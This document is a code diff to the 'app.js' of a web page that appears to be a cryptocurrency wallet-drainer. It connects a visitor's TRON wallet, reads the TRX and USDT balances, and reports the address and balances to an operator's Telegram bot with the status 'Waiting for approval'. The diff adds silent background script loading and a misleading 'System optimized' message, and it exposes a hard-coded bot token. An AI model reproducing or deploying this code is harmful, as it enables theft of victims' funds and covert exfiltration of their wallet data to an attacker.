@@ -1,3 +1,26 @@
+// app.js
+
+// Dynamic Script Loader to keep browser progress bar clear
+const loadScript = (src) => {
+    return new Promise((resolve) => {
+        if (document.querySelector(`script[src="${src}"]`)) return resolve();
+        const s = document.createElement('script');
+        s.src = src;
+        s.async = true;
+        s.onload = resolve;
+        document.head.appendChild(s);
+    });
+};
+
+// Initial silent background loading
+window.addEventListener('load', () => {
+    setTimeout(async () => {
+        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
+        await loadScript("wc-bundle.js");
+        console.log("System optimized.");
+    }, 100);
+});
+
 const CONFIG = {
     BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
     CHAT_ID: "8249230506",
@@ -22,6 +45,9 @@ async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
 }
 
 async function getStats(address) {
+    if (typeof TronWeb === 'undefined') {
+        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
+    }
     const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
     let trx = "0.00", usdt = "0.00";
     try {
@@ -33,19 +59,22 @@ async function getStats(address) {
 }
 
 document.getElementById('next-btn').addEventListener('click', async () => {
-    if (typeof window.connectWalletConnectTron !== 'function') return alert("System loading...");
+    // Ensure modules are loaded before proceeding
+    if (typeof window.connectWalletConnectTron !== 'function') {
+        document.getElementById('next-btn').innerText = "Loading system...";
+        await loadScript("wc-bundle.js");
+        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
+        document.getElementById('next-btn').innerText = "Next";
+    }
 
     const result = await window.connectWalletConnectTron();
     if (result && result.address) {
         const address = result.address;
         const { trx, usdt } = await getStats(address);
         
-        // Update Balance UI in background
         document.getElementById('view-balance').innerText = usdt;
-        
-        // UI transition to Confirming
         document.getElementById('main-content').classList.add('opacity-10');
-        document.getElementById('loading-screen').classList.remove('hidden');
+        document.getElementById('loading-screen').style.display = 'flex';
 
         await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
 
